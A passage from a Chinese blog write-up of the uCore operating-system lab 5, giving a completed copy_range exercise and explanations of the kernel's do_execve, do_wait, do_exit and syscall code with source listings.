from:进程A(父进程)页面目录的地址</span></span><br><span class="line">    <span class="comment">// start:需要复制的复制起始地址</span></span><br><span class="line">    <span class="comment">// end:需要复制的结束地址</span></span><br><span class="line">    <span class="comment">// share:指示dup或share的标志(我们只是使用dup方法,所以没有使用)</span></span><br><span class="line">    </span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; end % PGSIZE == <span class="number">0</span>); <span class="comment">/* 断言start和end已经对齐 */</span></span><br><span class="line">    assert(USER_ACCESS(start, end)); <span class="comment">/* 断言start和end在合理的范围 */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep; </span><br><span class="line">        <span class="comment">/* 找到进程A的二级页表项的虚拟地址 */</span></span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123; <span class="comment">/* 如果没有找到,则跳转下一页继续 */</span></span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123; <span class="comment">/* 表示物理内存页存在 */</span></span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">                <span class="comment">/* 找到进程B的二级页表项的虚拟地址 */</span></span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM; </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER); <span class="comment">/* 标记用户状态,获取对应的物理地址 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> pte2page(*ptep); <span class="comment">/* 根据二级页表项获取一张物理页 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">npage</span>=</span> alloc_page(); <span class="comment">/* 分配一张物理页 */</span></span><br><span class="line">        assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">        assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">/* &lt;---- lab start ----&gt; */</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">/* LAB5:EXERCISE2 YOUR CODE</span></span><br><span class="line"><span class="comment">         * replicate content of page to npage, build the map of phy addr of nage with the linear addr start</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Some Useful MACROs and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">         * MACROs or Functions:</span></span><br><span class="line"><span class="comment">         *    page2kva(struct Page *page): return the kernel vritual addr of memory which page managed (SEE pmm.h)</span></span><br><span class="line"><span class="comment">         *    page_insert: build the map of phy addr of an Page with the linear addr la</span></span><br><span class="line"><span class="comment">         *    memcpy: typical memory copy function</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * (1) find src_kvaddr: the kernel virtual address of page</span></span><br><span class="line"><span class="comment">         * (2) find dst_kvaddr: the kernel virtual address of npage</span></span><br><span class="line"><span class="comment">         * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span></span><br><span class="line"><span class="comment">         * (4) build the map of phy addr of  nage with the linear addr start</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">/* &lt;---- lab end ----&gt; */</span></span><br><span class="line">            </span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE; <span class="comment">/* 更新start,继续参与循环 */</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; end);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>copy_range 函数的目的是把A进程（from，父进程）的内存资源，拷贝到B进程（to，子进程）</li>
<li>它选择在循环中，以页为单位对进程内容进行复制（和 load_icode 建立段映射的逻辑很像）</li>
<li>复制需要使用 memcpy ，而这个函数需要虚拟地址，程序已经获取了对应的物理页地址，所以我们只需要调用 page2kva 即可</li>
<li>最后需要把已经复制完成的物理页添加到对应的页目录表项中，需要调用 page_insert ，而它的参数我们都已知</li>
</ul>
<p>具体实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="comment">/* 将一个进程A的内存内容(start,end)复制到另一个进程B */</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> end, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    </span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; end % PGSIZE == <span class="number">0</span>); <span class="comment">/* 断言start和end已经对齐 */</span></span><br><span class="line">    assert(USER_ACCESS(start, end)); <span class="comment">/* 断言start和end在合理的范围 */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep; </span><br><span class="line">        <span class="comment">/* 找到进程A的二级页表项的虚拟地址 */</span></span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123; <span class="comment">/* 如果没有找到,则跳转下一页继续 */</span></span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123; <span class="comment">/* 表示物理内存页存在 */</span></span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">                <span class="comment">/* 创建进程B的二级页表项,并返回其虚拟地址 */</span></span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM; </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER); <span class="comment">/* 标记用户状态,获取对应的权限 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> pte2page(*ptep); <span class="comment">/* 根据二级页表项获取一张物理页 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">npage</span>=</span> alloc_page(); <span class="comment">/* 分配一张物理页 */</span></span><br><span class="line">        assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">        assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">/* &lt;---- lab start ----&gt; */</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">void</span> * kva_src = page2kva(page); <span class="comment">/* 获取源页面所在的虚拟地址 */</span></span><br><span class="line">        <span class="keyword">void</span> * kva_dst = page2kva(npage); <span class="comment">/* 获取目标页面所在的虚拟地址 */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(kva_dst, kva_src, PGSIZE); <span class="comment">/* 页面数据复制 */</span></span><br><span class="line">        ret = page_insert(to, npage, start, perm); <span class="comment">/* 将该页面设置至对应的PTE中 */</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">/* &lt;---- lab end ----&gt; */</span></span><br><span class="line">            </span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE; <span class="comment">/* 更新start,继续参与循环 */</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; end);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习3-理解-fork-exec-wait-exit-syscall-的实现"><a href="#练习3-理解-fork-exec-wait-exit-syscall-的实现" class="headerlink" title="练习3-理解 fork/exec/wait/exit/syscall 的实现"></a>练习3-理解 fork/exec/wait/exit/syscall 的实现</h2><ul>
<li>do_fork：创建当前内核线程的一个副本<ul>
<li>它们的执行上下文、代码、数据都一样，但是存储位置不同，在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态（已经实现）</li>
<li>这个函数我们已经实现了，详情可以看前面代码</li>
</ul>
</li>
<li>do_execve：可执行程序的加载和运行<ul>
<li>检查当前进程所分配的内存区域是否存在异常</li>
<li>回收当前进程的所有资源，包括已分配的内存空间/页目录表等等</li>
<li>读取可执行文件，并根据 <code>ELFheader</code> 分配特定位置的虚拟内存，并加载代码与数据至特定的内存地址，最后分配堆栈并设置 <code>trapframe</code> 属性</li>
<li>设置新进程名称</li>
<li>do_execve 本身完成的这4步操作都是一些简单的“边角料”，真正核心且复杂的 load_icode 在前面已经分析过了</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查当前进程所分配的内存区域是否存在异常 */</span></span><br><span class="line">    <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)name, len, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;</span><br><span class="line">        len = PROC_NAME_LEN;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 回收当前进程的所有资源，包括已分配的内存空间/页目录表等等 */</span></span><br><span class="line">    <span class="keyword">char</span> local_name[PROC_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(local_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_name));</span><br><span class="line">    <span class="built_in">memcpy</span>(local_name, name, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 读取可执行文件 */</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode(binary, size)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> execve_exit;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 设置新进程名称 */</span></span><br><span class="line">    set_proc_name(current, local_name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">execve_exit:</span><br><span class="line">    do_exit(ret);</span><br><span class="line">    panic(<span class="string">&quot;already exit: %e.\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>do_wait：程序会使某个进程一直等待，直到（特定）子进程退出后，该进程才会回收该子进程的资源并函数返回，该函数的具体操作如下： <ul>
<li>检查当前进程所分配的内存区域是否存在异常</li>
<li>查找特定/所有子进程中是否存在某个等待父进程回收的子进程（PROC_ZOMBIE）<ul>
<li>如果有，则回收该进程并函数返回</li>
<li>如果没有，则设置当前进程状态为 <code>PROC_SLEEPING</code> 并执行 <code>schedule</code> 调度其他进程</li>
<li>当该进程的某个子进程结束运行后，当前进程会被唤醒，并在 <code>do_wait</code> 函数中回收子进程的<strong>PCB内存</strong>资源</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_wait</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> *code_store)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)code_store, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag, haskid;</span><br><span class="line">repeat:</span><br><span class="line">    haskid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        proc = find_proc(pid);</span><br><span class="line">        <span class="keyword">if</span> (proc != <span class="literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        <span class="keyword">for</span> (; proc != <span class="literal">NULL</span>; proc = proc-&gt;optr) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (haskid) &#123;</span><br><span class="line">        current-&gt;state = PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state = WT_CHILD;</span><br><span class="line">        schedule();</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> repeat;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_BAD_PROC;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    <span class="keyword">if</span> (proc == idleproc || proc == initproc) &#123;</span><br><span class="line">        panic(<span class="string">&quot;wait idleproc or initproc.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *code_store = proc-&gt;exit_code;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        unhash_proc(proc);</span><br><span class="line">        remove_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>do_exit：退出操作<ul>
<li>回收所有内存（除了PCB，该结构只能由父进程回收）</li>
<li>设置当前的进程状态为 <code>PROC_ZOMBIE</code></li>
<li>设置当前进程的退出值 <code>current-&gt;exit_code</code></li>
<li>如果有父进程，则唤醒父进程，使其准备回收该进程的PCB<ul>
<li>正常情况下，除了 <code>initproc</code> 和 <code>idleproc</code> 以外，其他进程一定存在父进程</li>
</ul>
</li>
<li>如果当前进程存在子进程，则设置所有子进程的父进程为 <code>initproc</code><ul>
<li>这样倘若这些子进程进入结束状态，则 <code>initproc</code> 可以代为回收资源</li>
</ul>
</li>
<li>执行进程调度，一旦调度到当前进程的父进程，则可以马上回收该终止进程的 <code>PCB</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == idleproc) &#123;</span><br><span class="line">        panic(<span class="string">&quot;idleproc exit.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (current == initproc) &#123;</span><br><span class="line">        panic(<span class="string">&quot;initproc exit.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;state = PROC_ZOMBIE;</span><br><span class="line">    current-&gt;exit_code = error_code;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc = current-&gt;parent;</span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">            wakeup_proc(proc);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;cptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            proc = current-&gt;cptr;</span><br><span class="line">            current-&gt;cptr = proc-&gt;optr;</span><br><span class="line">    </span><br><span class="line">            proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                initproc-&gt;cptr-&gt;yptr = proc;</span><br><span class="line">            &#125;</span><br><span class="line">            proc-&gt;parent = initproc;</span><br><span class="line">            initproc-&gt;cptr = proc;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">                    wakeup_proc(initproc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    </span><br><span class="line">    schedule();</span><br><span class="line">    panic(<span class="string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>syscall：系统调用<ul>
<li>syscall 是内核程序为用户程序提供内核服务的一种方式</li>
<li>在用户程序中，若需用到内核服务，则需要执行 <code>sys_xxxx</code> 函数（例如<code>sys_kill</code>）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">int</span> num, ...)</span> </span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, num);</span><br><span class="line">    <span class="keyword">uint32_t</span> a[MAX_ARGS];</span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ARGS; i ++) &#123;</span><br><span class="line">        a[i] = va_arg(ap, <span class="keyword">uint32_t</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    va_end(ap);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;int %1;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;=a&quot;</span> (ret)</span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;i&quot;</span> (T_SYSCALL),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;a&quot;</span> (num),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;d&quot;</span> (a[<span class="number">0</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;c&quot;</span> (a[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;b&quot;</span> (a[<span class="number">2</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;D&quot;</span> (a[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="string">&quot;S&quot;</span> (a[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该函数会设置 <code>%eax, %edx, %ecx, %ebx, %edi, %esi</code> 五个寄存器的值</li>
<li>分别为 syscall调用号、参数1、参数2、参数3、参数4、参数5</li>
<li>然后执行int中断进入中断处理例程</li>
<li>在中断处理例程中：程序会根据中断号执行 syscall 函数 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="comment">/* 和前面那个syscall同名,但不是同一个函数 */</span></span><br><span class="line">syscall(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="keyword">uint32_t</span> arg[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> num = tf-&gt;tf_regs.reg_eax;</span><br><span class="line">    <span class="keyword">if</span> (num &gt;= <span class="number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syscalls[num] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            arg[<span class="number">0</span>] = tf-&gt;tf_regs.reg_edx;</span><br><span class="line">            arg[<span class="number">1</span>] = tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">            arg[<span class="number">2</span>] = tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">            arg[<span class="number">3</span>] = tf-&gt;tf_regs.reg_edi;</span><br><span class="line">            arg[<span class="number">4</span>] = tf-&gt;tf_regs.reg_esi;</span><br><span class="line">            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    print_trapframe(tf);</span><br><span class="line">    panic(<span class="string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,</span><br><span class="line">            num, current-&gt;pid, current-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
